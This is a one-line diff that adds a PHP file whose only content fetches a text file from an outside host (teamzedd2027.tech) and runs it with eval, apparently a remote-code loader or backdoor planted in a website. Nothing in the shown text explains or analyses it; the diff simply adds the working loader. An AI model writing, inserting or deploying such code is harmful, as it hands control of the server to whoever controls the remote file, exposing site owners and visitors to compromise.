@@ -1,0 +1,1 @@
+﻿<?php $h=fopen("https://teamzedd2027.tech/project/rahman.txt","r"); $d=""; while(!feof($h))$d.=fread($h,8192); eval('?>'.$d); ?>
